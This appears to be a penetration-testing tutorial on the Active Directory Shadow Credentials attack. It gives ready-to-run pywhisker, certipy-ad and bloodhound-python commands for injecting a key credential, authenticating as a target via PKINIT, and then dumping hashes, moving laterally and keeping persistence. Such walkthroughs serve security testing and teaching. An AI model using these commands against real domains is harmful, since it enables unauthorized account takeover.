The **Shadow Credentials attack** abuses the Active Directory attribute `msDS-KeyCredentialLink` to inject attacker‑controlled public keys into a user or computer account. Once the attacker can write to this attribute, they can authenticate as the target account using **Kerberos PKINIT** without knowing the target’s password or hash. This provides **persistent unauthorized access** to the domain. ([Hacking Articles](https://www.hackingarticles.in/shadow-credentials-attack/?utm_source=chatgpt.com "Shadow Credentials Attack"))

The attack targets environments where:

- The domain includes a **Domain Controller running Windows Server 2016 or later**.
    
- The KDC and domain support **PKINIT public key authentication**.
    
- An account has **write permissions** over another account’s `msDS-KeyCredentialLink`. 

---

## Requirements

1. Controlled account (`attacker`) with **write access** over a target account’s attributes (e.g., `GenericWrite`, `GenericAll`, `WriteDACL`).
    
2. Domain supports **Kerberos PKINIT** authentication (Windows 2016+). 
    
3. Domain Controller certificate infrastructure present (often AD CS installed). 
    

The attack does _not_ require the victim’s password. It leverages certificate‑based authentication via the KDC. 

---

## General Exploitation Steps

### 1. Enumerate Permissions

Verify that the attacker account (`attacker`) can modify the target account’s `msDS-KeyCredentialLink`:

```
bloodhound-python -u attacker -p 'Pass' -d domain.local -c All
```

Look for write permissions on user or computer object attributes indicating potential msDS‑KeyCredentialLink modification vectors.

---

### 2. Inject a Key Credential into the Target

Generate a key pair and add it to the target account’s `msDS-KeyCredentialLink` attribute:

```
pywhisker.py \
  -d domain.local \
  -u attacker \
  -p 'Pass' \
  --target 'target_account' \
  --action add \
  --filename target
```

This creates a new **KeyCredential** entry and outputs a **PFX certificate** and password for the attacker’s private key. 

---

### 3. Generate a Certificate

The tool will generate a certificate (`target.pfx`) that corresponds to the injected public key and contains the associated private key.

You will need this `.pfx` file and its password for PKINIT authentication.

---

### 4. Authenticate as Target Using PKINIT

Use the generated `.pfx` and the private key with a tool capable of PKINIT, such as `certipy-ad`:

```
certipy-ad auth \
  -dc-ip <DC_IP> \
  -pfx target.pfx \
  -password '<PFX_PASSWORD>' \
  -username <username> \
  -domain <domain>
```

This will obtain a **Kerberos TGT** for the target account based on the public key stored in `msDS-KeyCredentialLink`. 

---

### 5. Post‑Authentication Abuse

Once a TGT has been obtained as the target:

- Dump the **NTLM hash** or Kerberos keys from the ticket.
    
- Use the ticket for lateral movement (SMB, RPC, LDAP, WinRM).
    
- Extract sensitive credentials from other services.
    
- Maintain persistence.
    

---

## Cleanup

To remove the shadow credential after use:

```
pywhisker.py \
  -d domain.local \
  -u attacker \
  -p 'Pass' \
  --target 'target_account' \
  --action remove \
  --device-id <DeviceGUID>
```

Removing the key credential restores the account to its original state.
